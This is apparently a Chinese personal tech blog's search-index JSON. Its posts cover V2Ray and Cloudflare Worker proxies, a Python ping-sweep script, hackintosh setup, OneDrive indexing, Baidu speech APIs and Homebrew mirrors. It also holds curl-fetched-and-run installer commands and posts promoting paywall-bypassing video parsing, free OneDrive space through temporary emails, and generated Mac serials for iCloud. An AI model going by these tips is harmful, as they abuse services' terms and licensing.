文件将里面的 outbounds 关于地址、uuid、端口、额外ID 括起来的部分，修改为多台服务器的 伪*例子 省略 ..... &quot;outbounds&quot;: [ { &quot;protocol&quot;: &quot;vmess&quot;, &quot;settings&quot;: { &quot;vnext&quot;: [ { &quot;address&quot;: &quot;xxxxx&quot;, &quot;port&quot;: 443, &quot;users&quot;: [ { &quot;id&quot;: &quot;4sdasdasdasdasdasddsd&quot;, //第一个服务器 &quot;security&quot;: &quot;auto&quot;, &quot;alterId&quot;: 64 } ] }, //每台服务器配置间用 `,` 隔开 { &quot;address&quot;: &quot;xxxxxxxxx&quot;, &quot;port&quot;: 443, &quot;users&quot;: [ { &quot;id&quot;: &quot;dasdasdasdsadasdsad&quot;, //第二个服务器 &quot;security&quot;: &quot;auto&quot;, &quot;alterId&quot;: 64 } ] }, //每台服务器配置间用 `,` 隔开 { &quot;address&quot;: &quot;xxxxxxxxx&quot;, &quot;port&quot;: 443, &quot;users&quot;: [ { &quot;id&quot;: &quot;dasdasdasdsadasdsad&quot;, //第三个服务器 &quot;security&quot;: &quot;auto&quot;, &quot;alterId&quot;: 64 } ] } //最后这里没有 `,` 号 ] }, ..... 省略 然后添加自定义配置，选择编号的配置。 测速延迟等功能无法用，访问一下 Google，就知道配置好了没有。 参考项目博主在 Heroku 搭建 V2Ray","tags":[{"name":"heroku","slug":"heroku","permalink":"https://www.unkaer.cf/tags/heroku/"},{"name":"v2ray","slug":"v2ray","permalink":"https://www.unkaer.cf/tags/v2ray/"}]},{"title":"cloudflare worker反代上网","date":"2020-04-06T03:05:55.000Z","path":"cloudflare-worker.html","text":"jsproxy是 一个基于浏览器端 JS 实现的在线代理 cloudflare worker反代上网可看YouTube，1080p无压力（缺点，登录不了谷歌账号）访问谷歌可能会人机验证，访问不了 搭建没有CF账号的先注册一个：注册 有账号的直接 开始搭建 填写自己喜爱的二级域名然后创建worker 进入github项目的index.js,复制代码。 清除hello world示范代码后粘贴进去。 高级应用高速下载，将下载连接放入导航栏，即可利用 CDN 加速下载文件。下载github文件再也不愁啦 注意免费计划包括100,000 个请求/天、最多 30 个 Worker足够个人使用","tags":[{"name":"cloudflare","slug":"cloudflare","permalink":"https://www.unkaer.cf/tags/cloudflare/"},{"name":"科学上网","slug":"科学上网","permalink":"https://www.unkaer.cf/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}]},{"title":"python测范围ip延迟","date":"2020-04-05T08:01:17.000Z","path":"pyping.html","text":"python检测范围ip的延迟，并记录。魔改于别人的代码。用于python3版本。python3 ping ip 延迟ping ip延迟4次记录到 ip_True.txt失败ip记录到 ip_False.txt # coding=utf-8 import time import struct import socket import select import sys def chesksum(data): &quot;&quot;&quot; 校验 &quot;&quot;&quot; n = len(data) m = n % 2 sum = 0 for i in range(0, n - m, 2): sum += (data[i]) + ((data[i + 1]) &lt;&lt; 8) # 传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位 if m: sum += (data[-1]) # 将高于16位与低16位相加 sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff) sum += (sum &gt;&gt; 16) # 如果还有高于16位，将继续与低16位相加 answer = ~sum &amp; 0xffff # 主机字节序转网络字节序列（参考小端序转大端序） answer = answer &gt;&gt; 8 | (answer &lt;&lt; 8 &amp; 0xff00) return answer &#39;&#39;&#39; 连接套接字,并将数据发送到套接字 &#39;&#39;&#39; def raw_socket(dst_addr, imcp_packet): rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname(&quot;icmp&quot;)) send_request_ping_time = time.time() # send data to the socket rawsocket.sendto(imcp_packet, (dst_addr, 80)) return send_request_ping_time, rawsocket, dst_addr &#39;&#39;&#39; request ping &#39;&#39;&#39; def request_ping(data_type, data_code, data_checksum, data_ID, data_Sequence, payload_body): # 把字节打包成二进制数据 imcp_packet = struct.pack(&#39;&gt;BBHHH32s&#39;, data_type, data_code, data_checksum, data_ID, data_Sequence, payload_body) icmp_chesksum = chesksum(imcp_packet) # 获取校验和 imcp_packet = struct.pack(&#39;&gt;BBHHH32s&#39;, data_type, data_code, icmp_chesksum, data_ID, data_Sequence, payload_body) return imcp_packet &#39;&#39;&#39; reply ping &#39;&#39;&#39; def reply_ping(send_request_ping_time, rawsocket, data_Sequence, timeout=2): while True: started_select = time.time() what_ready = select.select([rawsocket], [], [], timeout) wait_for_time = (time.time() - started_select) if what_ready[0] == []: # Timeout return -1 time_received = time.time() received_packet, addr = rawsocket.recvfrom(1024) icmpHeader = received_packet[20:28] type, code, checksum, packet_id, sequence = struct.unpack( &quot;&gt;BBHHH&quot;, icmpHeader ) if type == 0 and sequence == data_Sequence: return time_received - send_request_ping_time timeout = timeout - wait_for_time if timeout &lt;= 0: return -1 &#39;&#39;&#39; 实现 ping 主机/ip &#39;&#39;&#39; def ping(host): cars = [] data_type = 8 # ICMP Echo Request data_code = 0 # must be zero data_checksum = 0 # &quot;...with value 0 substituted for this field...&quot; data_ID = 0 # Identifier data_Sequence = 1 # Sequence number payload_body = b&#39;abcdefghijklmnopqrstuvwabcdefghi&#39; # data dst_addr = socket.gethostbyname(host) # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变 print(&quot;正在 Ping {0} [{1}] 具有 32 字节的数据:&quot;.format(host, dst_addr)) yanc=0 for i in range(0, 4): icmp_packet = request_ping(data_type, data_code, data_checksum, data_ID, data_Sequence + i, payload_body) send_request_ping_time, rawsocket, addr = raw_socket(dst_addr, icmp_packet) times = reply_ping(send_request_ping_time, rawsocket, data_Sequence + i) if times &gt; 0: print(&quot;来自 {0} 的回复: 字节=32 时间={1}ms&quot;.format(addr, int(times * 1000))) cars.append(int(times * 1000)) yanc=yanc+int(cars[i]) time.sleep(0.7) else: print(&quot;请求超时。&quot;) return int(-1) return str(yanc/4) start_Time=int(time.time()) ip_True = open(&#39;ip_True.txt&#39;,&#39;w+&#39;) ip_False = open(&#39;ip_False.txt&#39;,&#39;w+&#39;) IPhost = [] IPbegin = (input(u&#39;请输入起始查询IP： &#39;)) IPend = input(u&#39;请输入终止查询IP： &#39;) IP1 = IPbegin.split(&#39;.&#39;)[0] IP2 = IPbegin.split(&#39;.&#39;)[1] IP3 = IPbegin.split(&#39;.&#39;)[2] IP4 = IPbegin.split(&#39;.&#39;)[-1] IPend_last = IPend.split(&#39;.&#39;)[-1] count_True,count_False = 0,0 for i in range(int(IP4)-1,int(IPend_last)): ip = str(IP1+&#39;.&#39;+IP2+&#39;.&#39;+IP3+&#39;.&#39;+IP4) int_IP4 = int(IP4) int_IP4 += 1 IP4 = str(int_IP4) yanchi=ping(ip) if (yanchi==int(-1)): print (&#39;ping %s is fail&#39;%ip) ip_False.write(ip+&#39;\\n&#39;) count_False += 1 else: print (&#39;ping %s is ok&#39;%ip) ip_True.write(ip+&#39; 延迟：&#39;+yanchi+&#39;\\n&#39;) count_True += 1 ip_True.close() ip_False.close() end_Time = int(time.time()) print (&quot;time(秒)：&quot;,end_Time - start_Time,&quot;s&quot;) print (&quot;ping通的ip数：&quot;,count_True,&quot; ping不通的ip数：&quot;,count_False) 参考本文代码基于以下修改：python实现批量ping IP，并将结果写入python 之实现ping测试延迟的两种方式","tags":[{"name":"python","slug":"python","permalink":"https://www.unkaer.cf/tags/python/"},{"name":"ping","slug":"ping","permalink":"https://www.unkaer.cf/tags/ping/"}]},{"title":"vip影视app","date":"2020-03-31T04:23:33.000Z","path":"vipvideos.html","text":"电脑主板坏了，在家无聊，各大视频平台需要会员，穷。于是集合互联网上视频解析服务的app诞生了。 安卓端蓝奏云下载链接 功能免会员看全网视频支持悬浮窗播放 网页端直接访问本站VIP视频解析","tags":[{"name":"视频","slug":"视频","permalink":"https://www.unkaer.cf/tags/%E8%A7%86%E9%A2%91/"},{"name":"vip","slug":"vip","permalink":"https://www.unkaer.cf/tags/vip/"}]},{"title":"申请onedrive 5T免费网盘","date":"2020-03-15T13:22:01.000Z","path":"onedrive5T.html","text":"申请onedive 5T免费网盘需要临时邮箱本站也提供本站域名十分钟邮箱服务，本站邮箱格式为，xxx@m.zan7l.tk。当然你也可以自己申请域名，做一个自己喜欢的。免费获取 Office365 5T 网盘空间（当使用量达90%以上，可申请扩容到25T，点击查看微软说明： OneDrive服务说明） 点此 获取可用验证邮箱 免费申请Office365 5T网盘空间 学生版 or 教师版 (教育版子账号不会翻车) 自定义的前缀请使用小写字母，大写字母获取不到验证码. 申请扩容，请发邮件到 mail@mzr.me 请注明前缀. 微软OD登陆地址：www.office.com 申请教程：https://yangyang.im/post/ONKcbU4-k/","tags":[{"name":"onedrive","slug":"onedrive","permalink":"https://www.unkaer.cf/tags/onedrive/"}]},{"title":"Fast OneDrive Index，OneDrive 秒级列表程序","date":"2020-03-15T07:01:21.000Z","path":"FODI.html","text":"FODI，OneDrive 秒级列表程序 FODI，Fast OneDrive Index 列表速度极快，且无需服务器，部署极为简单 在 Cloudflare 部署 FODI 后端打开 Cloudflare 注册页面，右上角可以选择简体中文，输入 邮箱 和 密码 后点击 创建账户 进入下个页面后直接点击左上角的 CLOUDFLARE 图标进入控制面板主页，不要进行其他操作。 进入主页后，点击靠近右下角的 Workers。 此时设置您的免费 Workers 子域， 设置一个个性点的，点击 设置，随后点击弹出对话框中的 确定。 之后会进入套餐选择页面，选择免费版本，点击它。 完成上述步骤后，系统会发送确认邮件到你的注册邮箱，请自行登录邮箱，找到相关邮件，点击其中的确认链接，完成确认。 获取 refresh_token进入 该网址（世纪互联版点我），点击其中的 Get a refresh_token，在打开的微软账号登录页面中，填写你的 OneDrive 账号和密码，完成登录。(如果想更改已登录账号，可以清楚cookie，或者用无痕模式访问 ctrl+shift+n) 登录完毕后浏览器将跳转回上面的页面，此时修改网址，从左往右找到第一个 ?，将其 删除。再找到第一个 &amp;，将其改为 ?，注意要使用英文输入法。下面是修改前后的网址对比： copy https://.../?authorization_code&amp;code=... https://.../authorization_code?code=... 修改完毕后直接回车，稍等片刻页面将返回 refresh_token，复制它备用。 上传 FODI 后端回到Cloudflare点击右下角的 Workers。 现在点击页面中间创建函数，进入代码编辑界面，复制 index.js中的代码，粘贴到代码编辑界面中。 接着填写 网盘展示根目录，如全盘展示则不填写。 最后填写 refresh_token。如果你的账号是世纪互联版本，要将IS_CN的值改为1`。 全部填写完毕后，点击页面中下部的 保存并部署。 部署 FODI 前端 通过 Github Pages 部署前端，前端仅是一个 HTML 文件 index.html，可放到任意静态服务器（如Github Pages），放在本地直接访问也行。 SCF 网关地址 换成 Cloudflare 的，就是图中网址，http://xxxx.dev 加密文件夹在某个文件夹下添加 .password 文件，里面写入密码，即可加密该文件夹。注意文件必须以 UTF8NoBOM 编码，且密码前后不能有空格或空行，Windows 下可通过以下方式生成： 在待加密文件夹下按住 Shift 键的同时，鼠标右击文件夹空白处，选择 在此处打开 Powershell 窗口(S)，接着执行以下命令，其中 1234 便是密码。 &#39;1234&#39; | Out-File -FilePath .password -Encoding ascii -NoNewline 添加描述在某个文件夹下添加 README.md 文件，里面按照markdown格式写描述，打卡该文件夹网址时下方会有相关描述。 分享可直接访问某目录，可跳过上级目录中的密码，直接访问某目录。 引用可作为下载连接。 参考资料 github-FODI FODI，一款 OneDrive 秒级列表程序 在 Cloudflare 部署 FODI 后端","tags":[{"name":"onedrive","slug":"onedrive","permalink":"https://www.unkaer.cf/tags/onedrive/"}]},{"title":"光影精灵4-黑苹果15安装记录","date":"2020-03-12T01:36:57.000Z","path":"mac15.html","text":"光影精灵4，黑苹果15安装记录 电脑配置 CPU i5-8300h 核显 HD630 内存 2*8GB 2667MHz 独显 GTX1050 下载镜像来自黑果小兵官网的macOS Catalina 10.15.3 19D76 正式版 with Clover 5103原版镜像本站使用的镜像是 macOS Catalina 10.15.3(19D76) Installer for Clover 5103 and WEPE.dmg本站网盘下载 （推荐配合IDM、aria2等工具可全速下载） 安装Mac1.制作U盘启动需要软件：balenaEtcher官网地址：https://www.balena.io/etcher/使用方法：选择镜像→选择U盘→点击Flash! 然后漫长的等待烧录完成 2.安装Mac①为Mac分区分一块硬盘来安装Mac。右键我的电脑—&gt;管理—&gt;磁盘管理—&gt;右键要压缩的磁盘—&gt;压缩盘—&gt;按照提示压缩一块合适你使用的大小。会有一个漫长的等待过程。 ②建立EFI分区镜像自带PE，U盘启动的第一个EFI进入PE系统，用DiskGenius在刚刚建立的空白分区上建立EFI分区，然后格式化剩余空间作为Mac安装的空间。不建立EFI，后面安装Mac时可能抹除失败。 ！！！ 镜像默认 config.plist 报错，无法用，添加正确的 config.plist ，重命名为其他的添加的CLOVER 文件夹中， ！！！不要替换！！！ 原因为查明，反正我的测试结果必须存在镜像自带的 config.plist 且无修改的，开机时选正确的config.plist才能成功。正确的config.plist可以修改 ## 重要提醒： 由于我的疏忽，导致`config.plist`使用了旧的、错误的文件，造成安装卡住的情况出现。请重新下载安装镜像或者替换[config.plist](http://7.daliansky.net/Patched/config.plist) ​ ----摘黑果小兵 ③安装MacU盘启动的第二个EFI进入Mac安装界面，先用磁盘工具，将用来安装安装Mac的分区盘抹除，格式为MacOS。然后一路安装，会重启几次。 驱动设置驱动的安装方法：（驱动EFI/clover/kext/Backup下都有备份）1.（推荐）驱动xxx.kext拷贝到EFI/clover/kext下，然后重启(建议一次安装一个，好排错，虽然有点慢)2.使用软件安装。。。。（不推荐） 1.网卡安装因为默认的就能用，so。。。 2.显卡开机后关于本机中图形卡显示就是1536MB，so。。。 3.声卡见于14中的经验 使用仿冒声卡 AppleALC.kext 驱动原生声卡。 将仿冒声卡 AppleALC.kext 放到 EFI/clover/kext 下，镜像默认已经ok 修改 EFI/Clover下config.plist 设备设置 -&gt; Audio -&gt; 注入 ID 官网注入ID的列表见 wiki-Supported codecs ALC295Realtek ALC295 layout 1, 3, 13, 14, 15, 21, 28, 77 14版中分别尝试后得出以下结果 Audio-ID 内置喇叭 耳机 内置麦克风 录制噪音 1 ❌ ⭕️ ⭕️ 无 3 ❌ ⭕️ ⭕️ 无 13 ⭕️ ⭕️ ⭕️ 无 15 ❌ ⭕️ ⭕️ 无 21 ⭕️ ⭕️ ⭕️ 微小 28 ⭕️ ⭕️ ⭕️ 无 77 ⭕️ ⭕️ ⭕️ 无 所以 ID 13、 21、 28、 77 均可使用，没有进一步进行比较。声音均比万能驱动的大，耳机与喇叭自动切换。 我15版直接用 13 ，可以用没有进行其他测试。 4.触控板同14版的经验安装触摸板驱动前需要明确你的触摸板型号是I2C还是PS2，可在Windows设备管理器查询。我的是PS2！！！同理两个驱动只能选择一个使用，不能同时放到驱动目录方式一：使用VoodooPS2Controller.kext驱动在我的电脑上这个驱动只支持点击并不支持多指手势，而且一点触控板，鼠标就乱飞，左键不能用（触控板多点几次以后，乱飞几次后，鼠标可恢复正常）。方式二：安装ApplePS2SmartTouchPad.kext驱动触控能用，但触控板设置用不了。在安装电量显示后正常使用。 5.电量显示1将驱动ACPIBatteryManager.kext放到EFI/clover/kexts目录下，2然后打上DSDT补丁，但实际操作中我没有这一步，重启后就直接显示正常了，如果有问题，去找相应的帖子。 6.一些缺陷没有亮度调节、Wi-Fi、蓝牙不能用，新BUG，14版就能直接用，有时间慢慢解决。 WIFI 因特尔的貌似无解 蓝牙同上 所以就没有定位功能 新Bug 没有摄像头 变白苹果，登陆icloud 先备份 config.plist 修改 config.plist文件(使用Clover Configurator Mac版打开) 机型设置选择一个配置相近，或者最新的型号 生成新的序列号 关于本机-服务支持，官网输入序列号，查询序列号是否有效(如果无效重新生成即可) 变量设置 - 生成 系统参数 - 复制机型设置中的SmuuID到系统参数中 保存，重启。 登录icloud成功 日常使用设置让Mac用起来更习惯一点 鼠标滚动不习惯Mac的鼠标滚轮，和win上刚好相反鼠标设置取消 滚动方向：自然 就行了 输入法切换Mac默认输入法切换的快捷键没开键盘-快捷键-输入法 中打开，还可以自定义快捷键 推荐一个软件，自动切换输入法 时间显示在菜单栏显示时间和日期，方便看时间日期与时间-时钟 电量百分比显示在菜单栏显示电池状态节能 实时网速想看实时网速，win上面习惯了推荐软件 Bandwidth Mac应用商店里面就有打开软件的偏好设置，将实时流量显示在菜单栏上 推荐软件 ishot-截图-长截图-标注工具 超级右键 自动切换输入法 Better Menubar实时显示CPU、内存、网络等 Better And Better以上工具的集合","tags":[{"name":"mac","slug":"mac","permalink":"https://www.unkaer.cf/tags/mac/"}]},{"title":"方舟：生存进化开服教程","date":"2020-03-01T10:26:37.000Z","path":"ARK.html","text":"ARK，管理工具搭建方舟生存进化私服（非官方服务器）方舟：生存进化游戏简介，史低27元 服务器配置白嫖的阿里云半年云服务器，突发性能实例|处理器|2.G 25%基准||—|—||运行内存|4G||硬盘|40G||宽带|1M|配置很渣，几个人用来玩，没有问题。内存太低，可能会启动失败。所以设置了10G的虚拟内存，及共14G可用，实际测试中，在启动的过程最高占用了12G多，切花了20多分钟才启动完成。 ARK 方舟服务器管理器官网下载github安装包下载 下载安装选data数据存放目录然后会自动安装steam CMD 设置中文右上角有个小齿轮，里面可以设置简体中文 新建配置点击左上角 绿色的 + 按钮写一个改配置的名字 更新安装方舟服务器资源，后面有个 更新/安装然后会下载方舟服务器资源。安装完后，安装版本可能还是0.0，不用管，显示的问题，启动后就正常了。 基础设置基础管理服务器名称，密码等，DIY网络对应的端口要保证外网能访问，服务器安全组要放行相应端口。选择一张地图使用所以CPU内核使用高速缓存强制使用无天空特效 启动测试出现过两种问题 分辨率不能太低远程连接服务器时分辨率设置高一点 内存不能太低虚拟内存分大一点，虚拟内存+物理内存最少要14Gmod安装输入mod编号 ACM V2.7.1294 [UNSTABLE]https://steamcommunity.com/sharedfiles/filedetails/?id=558079412&amp;searchtext=ACM可以刷出任意数量、等级的任何物品（≈外挂）mod编号：558079412 超级望远镜https://steamcommunity.com/sharedfiles/filedetails/?id=1404697612&amp;searchtext=awesome+spyglass可以看恐龙属性、状态、驯养需要什么等等、很方便mod编号：1404697612 传送器https://steamcommunity.com/sharedfiles/filedetails/?id=889745138&amp;searchtext=awesomemod编号：889745138 死亡不掉装备https://steamcommunity.com/sharedfiles/filedetails/?id=1315534671&amp;searchtext=deathmod编号：1315534671如果单机想用上述mod，订阅mod，启动时选择要加载的mod就行了地图多通需要设置 集群id 为一样的就行了设置 一些优化人物环境自己看着改倍率。。。","tags":[{"name":"方舟：生存进化","slug":"方舟：生存进化","permalink":"https://www.unkaer.cf/tags/%E6%96%B9%E8%88%9F%EF%BC%9A%E7%94%9F%E5%AD%98%E8%BF%9B%E5%8C%96/"}]},{"title":"python调用百度语音","date":"2020-02-06T12:05:27.000Z","path":"pythonAI.html","text":"用Python调用百度语音，学习 python 百度语音识别和合成。 用 Python 调用百度语音学习 python百度语音识别和合成 一、整体结构SpeechRecognition（录音）--&gt; 百度语音（Speech-to-Text）--&gt; 百度语音（Text-to-Speech)--&gt; PyAudio（音频播放） 循环 二、SpeechRecognitionSpeechRecogintion 是 Python 的一个语音识别框架。 本项目里的语音识别及合成用的是百度的开放服务，所以只是需要 SpeechRecogintion 的录音功能。它可以检测语音中的停顿自动终止录音并保存，比 PyAudio 更人性化（代码写起来也更简单）。 安装 SpeechRecognitionpip install SpeechRecognition 录音代码import speech_recognition as sr def rec(rate=16000): r = sr.Recognizer() with sr.Microphone(sample_rate=rate) as source: print(&quot;please say something&quot;) audio = r.listen(source) with open(&quot;recording.wav&quot;, &quot;wb&quot;) as f: f.write(audio.get_wav_data()) rec() 从系统麦克风拾取音频数据，采样率为 16000（貌似百度语音 API 最高就支持到 16k 的采样率）。之后把采集到的音频数据以 wav 格式保存在当前目录下的 recording.wav 文件中，供后面的程序使用。 录音完成后，可以找到录好的音频文件试听一下效果。 三、百度语音（STT）百度语音是百度云 AI 开放平台提供的支持语音识别和语音合成的服务，注册以后就可以直接访问它的 REST API 了，并且有向普通用户提供免费的调用额度。 创建应用注册成功以后，进入语音服务的控制台创建一个新的应用，记下自己的 AppID、API Key 和 Secret Key。 安装百度API：pip install baidu-aip 语音识别代码如下（代码中的 Key 替换成自己的）：from aip import AipSpeech APP_ID = &#39;Your AppID&#39; API_KEY = &#39;Your API Key&#39; SECRET_KEY = &#39;Your Secret Key&#39; client = AipSpeech(APP_ID, API_KEY, SECRET_KEY) def listen(): with open(&#39;recording.wav&#39;, &#39;rb&#39;) as f: audio_data = f.read() result = client.asr(audio_data, &#39;wav&#39;, 16000, { &#39;dev_pid&#39;: 1536, }) result_text = result[&quot;result&quot;][0] print(&quot;you said: &quot; + result_text) return result_text listen() 简单来说，将 SpeechRecognition 录制的音频上传至百度语音的服务，返回识别后的文本结果并输出。 四、百度语音（TTS）其实大部分系统都有内置的 TTS （即文本转语音）引擎，如 MacOS 的 say 命令，只不过其中有很多都显得太“机械”，呃，缺少“人情味儿”。。。 百度的 TTS 引擎语音效果听起来还是很不错的（4 号选手度丫丫）。 测试代码如下：from aip import AipSpeech APP_ID = &#39;Your AppID&#39; API_KEY = &#39;Your API Key&#39; SECRET_KEY = &#39;Your Secret Key&#39; client = AipSpeech(APP_ID, API_KEY, SECRET_KEY) def speak(text=&quot;&quot;): result = client.synthesis(text, &#39;zh&#39;, 1, { &#39;spd&#39;: 4, &#39;vol&#39;: 5, &#39;per&#39;: 4, }) if not isinstance(result, dict): with open(&#39;audio.mp3&#39;, &#39;wb&#39;) as f: f.write(result) speak(&quot;你好啊&quot;) 就是把需要转换成语音的文本内容上传，再将返回的数据保存在本地。貌似只能生成 mp3 格式。 五、PyAudio 播放安装 PyAudio Windows到官网https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio下载对应版本PyAudio-0.2.11-cp38-cp38-win32.whlcp38代表python版本号3.8下载完成后安装 pip install PyAudio-0.2.11-cp38-cp38-win32.whl Linux apt install python3-pyaudio 没找到 Python 播放 MP3 的合适的方法，所以用sox 命令将 MP3 转为 wav 格式，再用 PyAudio 播放。 安装 soxSoX 是一个强大的跨平台的音频处理工具 Windowssox官网下载安装目录编入环境变量 Linux sudo apt-get install sox libsox-fmt-mp3 代码如下：import pyaudio import wave import os import time def play(): os.system(&#39;sox audio.mp3 audio.wav&#39;) wf = wave.open(&#39;audio.wav&#39;, &#39;rb&#39;) p = pyaudio.PyAudio() def callback(in_data, frame_count, time_info, status): data = wf.readframes(frame_count) return (data, pyaudio.paContinue) stream = p.open(format=p.get_format_from_width(wf.getsampwidth()), channels=wf.getnchannels(), rate=wf.getframerate(), output=True, stream_callback=callback) stream.start_stream() while stream.is_active(): time.sleep(0.1) stream.stop_stream() stream.close() wf.close() p.terminate() play() 六、最终代码上述代码整合到一起 # -*- coding: utf-8 -*- # 录音 import speech_recognition as sr def rec(rate=16000): r = sr.Recognizer() with sr.Microphone(sample_rate=rate) as source: print(&quot;please say something&quot;) audio = r.listen(source) with open(&quot;recording.wav&quot;, &quot;wb&quot;) as f: f.write(audio.get_wav_data()) # 百度API from aip import AipSpeech APP_ID = &#39;Your AppID&#39; API_KEY = &#39;Your API Key&#39; SECRET_KEY = &#39;Your Secret Key&#39; client = AipSpeech(APP_ID, API_KEY, SECRET_KEY) # 百度语音识别 def listen(): with open(&#39;recording.wav&#39;, &#39;rb&#39;) as f: audio_data = f.read() result = client.asr(audio_data, &#39;wav&#39;, 16000, { &#39;dev_pid&#39;: 1536, }) result_text = result[&quot;result&quot;][0] print(&quot;you said: &quot; + result_text) return result_text # 百度语音合成 def speak(text=&quot;&quot;): result = client.synthesis(text, &#39;zh&#39;, 1, { &#39;spd&#39;: 4, &#39;vol&#39;: 5, &#39;per&#39;: 4, }) if not isinstance(result, dict): with open(&#39;audio.mp3&#39;, &#39;wb&#39;) as f: f.write(result) # 播放音频 import pyaudio import wave import os import time def play(): os.system(&#39;sox audio.mp3 audio.wav&#39;) wf = wave.open(&#39;audio.wav&#39;, &#39;rb&#39;) p = pyaudio.PyAudio() def callback(in_data, frame_count, time_info, status): data = wf.readframes(frame_count) return (data, pyaudio.paContinue) stream = p.open(format=p.get_format_from_width(wf.getsampwidth()), channels=wf.getnchannels(), rate=wf.getframerate(), output=True, stream_callback=callback) stream.start_stream() while stream.is_active(): time.sleep(0.1) stream.stop_stream() stream.close() wf.close() p.terminate() # 循环调用 while True: rec() request = listen() speak(request) play() 参考资料用 Python 实现自己的智能语音助理（百度语音 + 图灵机器人）","tags":[{"name":"python","slug":"python","permalink":"https://www.unkaer.cf/tags/python/"}]},{"title":"Motrix","date":"2020-02-03T13:10:36.000Z","path":"Motrix.html","text":"Motrix是基于aria2一款支持多种链接的下载工具 Motrix官网 GitHub项目Motrix 是一款全能的下载工具，支持下载 HTTP、FTP、BT、磁力链、百度网盘等资源。 ✈️ 去 官网 逛逛 | 📖 查看 帮助手册 备用下载下载太慢本站提供备用下载1.41 💽 安装稳定版GitHub 和 官网 提供了已经编译好的稳定版安装包，当然你也可以自己克隆代码编译打包。 Windows建议使用安装包（Motrix-Setup-x.y.z.exe）安装 Motrix 以确保完整的体验，例如关联 torrent 文件，捕获磁力链等。 如果你更喜欢便携版，你可以使用 scoop（需要 Windows 7+，天朝用户可能需要设置 Git 代理）安装最新便携版本的 Motrix。 scoop bucket add extras scoop install motrix macOSmacOS 用户可以使用 brew cask 安装 Motrix，感谢 Mitscherlich 的 PR。 brew update &amp;&amp; brew cask install motrix Linux你可以下载 AppImage（适用于所有 Linux 发行版）软件包或 snap 或从源代码构建安装 Motrix。 构建请阅读 编译打包 部分。 对于 Arch Linux 用户，可以使用 aur 安装 Motrix，感谢维护者 weearc。 运行以下命令进行安装： yay motrix Motrix 在 Linux 中首次启动可能需要使用 sudo 运行，因为可能没有创建下载会话文件的权限 (/var/cache/aria2.session)。 ✨ 特性 🕹 简洁明了的图形操作界面 🦄 支持BT和磁力链任务 ☑️ 支持选择性下载BT部分文件 💾 支持下载百度云盘资源 🎛 最高支持 10 个任务同时下载 🚀 单任务最高支持 64 线程下载 🚥 设置上传/下载限速 🕶 模拟用户代理UA 🔔 下载完成后通知 💻 支持触控栏快捷键 (Mac 专享) 🤖 常驻系统托盘，操作更加便捷 🌑 深色模式 🗑 移除任务时可同时删除相关文件 🌍 国际化 🖥 应用界面 ⌨️ 本地开发克隆代码git clone git@github.com:agalwood/Motrix.git 安装依赖cd Motrix npm install 天朝大陆用户建议使用淘宝的 npm 源 npm config set registry &#39;https://registry.npm.taobao.org&#39; export ELECTRON_MIRROR=&#39;https://npm.taobao.org/mirrors/electron/&#39; export SASS_BINARY_SITE=&#39;https://npm.taobao.org/mirrors/node-sass&#39; 如果喜欢 Yarn，也可以使用 yarn 安装依赖 开发模式npm run dev 编译打包npm run build 完成之后可以在项目的 release 目录看到编译打包好的应用文件","tags":[{"name":"下载","slug":"下载","permalink":"https://www.unkaer.cf/tags/%E4%B8%8B%E8%BD%BD/"}]},{"title":"Mac安装Homebrew","date":"2020-01-31T09:48:20.000Z","path":"Mac-Homebrew.html","text":"Mac安装的homebrew慢,更换为国内源。 下载安装文件到本地打开终端,输入： curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install &gt;&gt; brew_install 会在当前目录下创建文件 brew_install 修改镜像源vim修改文件 vim brew_install 用 # 注释掉 BREW_REPO = &quot;https://github.com/Homebrew/brew&quot;.freeze改为清华大学的镜像地址 BREW_REPO = &quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;.freeze 保存退出 安装运行 /usr/bin/ruby brew_install 安装中途仍然有较慢的部分，不过相比官方安装方式快多了。 Homebrew 镜像使用帮助摘自 https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ 注:该镜像是 Homebrew 的 formula 索引的镜像（即 brew update 时所更新内容）。本镜像站同时提供 Homebrew 二进制预编译包的镜像，请参考 Homebrew bottles 镜像使用帮助。 替换现有上游 git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git brew update 复原(感谢Snowonion Lee提供说明) git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git brew update Homebrew-bottles 镜像使用帮助摘自 https://mirrors.tuna.tsinghua.edu.cn/help/homebrew-bottles/ 注:该镜像是 Homebrew 二进制预编译包的镜像。本镜像站同时提供 Homebrew 的 formula 索引的镜像（即 brew update 时所更新内容），请参考 Homebrew 镜像使用帮助。 临时替换 export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles 长期替换 echo &#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles&#39; &gt;&gt; ~/.bash_profile source ~/.bash_profile 附表卸载homebrew/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot; homebrew常用命令 查看homebrew版本 brew -v 查看已安装的包 brew list 安装包 brew install packageName 卸载包 brew uninstall packageName 查找包 brew searck packageName 查看包信息 brew info packageName 更新homebrew brew update 诊断homebrew brew doctor 查看帮助信息 brew -h","tags":[{"name":"Mac","slug":"Mac","permalink":"https://www.unkaer.cf/tags/Mac/"}]},{"title":"Hexo-BlueLake主题随机句子","date":"2020-01-23T02:57:58.000Z","path":"BlueLake-sentence.html","text":"BlueLake主题添加随机句子 jade格式js随机句子代码在合适的.jade文件位置添加随机句子jade格式代码代码如下 